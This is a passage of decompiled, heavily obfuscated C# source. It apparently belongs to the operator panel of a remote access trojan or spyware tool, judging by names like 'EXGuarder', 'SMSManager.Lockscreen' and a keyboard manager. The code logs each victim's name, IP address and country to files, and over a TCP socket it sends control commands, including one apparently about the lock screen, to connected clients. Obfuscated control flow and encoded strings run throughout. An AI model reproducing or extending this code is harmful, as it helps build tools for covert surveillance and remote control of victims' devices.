          int num4 = 1779744241;
label_8:
          string str;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) -((720899013 ^ -507254632) - ~(-num5 - (-(-991982579 * 1177216321 ^ ~-999434873) - (646675679 * 2105079527 - (1964304533 - -792392213) ^ 1374565113 - 1604515716))) * -682563819)) % 9U)
            {
              case 0:
                // ISSUE: reference to a compiler-generated field
                int num7 = File.Exists(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003374D7915 + str) ? 1772821206 : (num7 = -1176219618);
                num4 = num7 ^ (int) num6 * -655627828;
                continue;
              case 1:
                goto label_15;
              case 2:
                // ISSUE: reference to a compiler-generated field
                Process.Start(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003654B3B1D);
                num4 = (int) num6 * -1045211329 ^ 106252609;
                continue;
              case 3:
                goto label_3;
              case 4:
                // ISSUE: reference to a compiler-generated field
                Directory.CreateDirectory(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003654B3B1D);
                num4 = (int) num6 * -312031913 ^ -1849846398;
                continue;
              case 5:
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                File.AppendAllText(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003374D7915 + str, EXGuarder.\u00331052911 + ((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).ClientName + EXGuarder.\u00364401376 + ((Data) ((ScreenReader) this).Classclient).ClientAddressIP + EXGuarder.\u0032179332C + ((Data._Closure\u0024__39\u002D11) ((ScreenReader) this).Classclient).Country + EXGuarder.\u0035F4A631A + DateTime.Now.ToString() + EXGuarder.\u0032E1C0217);
                num4 = (int) num6 * -485762269 ^ 2056240090;
                continue;
              case 6:
                // ISSUE: reference to a compiler-generated field
                File.AppendAllText(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003374D7915 + str, str + this.statustext.Text + EXGuarder.\u003271D7626);
                num4 = -1601955577;
                continue;
              case 7:
                // ISSUE: reference to a compiler-generated field
                File.Create(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003374D7915 + str).Dispose();
                num4 = (int) num6 * 1600598337 ^ 281405764;
                continue;
              case 8:
                goto label_7;
              default:
                goto label_18;
            }
          }
label_3:
          return;
label_18:
          return;
label_15:
          str = DateTime.Now.ToString(EXGuarder.\u0034F356114) + EXGuarder.\u003144B6121;
          num4 = 1570627276;
          goto label_8;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private void KeyboardManager_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (!this.checkenable.Checked)
        return;
label_1:
      int num1 = 970466331;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(~(num1 - ((~1348119672 ^ ~1063509428 - -682556376 ^ ~~-825575040) + (-855971418 - ((-1778306223 - 1710172392) * -201408003 - (-832769706 - -408877632 + 1186194309))))) * -1815153629) ^ -1971082481 ^ -588672653)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            TcpClient client = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            string[] strArray = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenReader) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036F4B0516 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003276F141B),
              (object) ((ScreenReader) this).Classclient
            });
            num1 = (int) num2 * -1506429459 ^ -1061848386;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern KeyboardManager(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] obj,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void updatedele(object[] obj);

    public delegate void recordnames(object[] obj);
  }
}
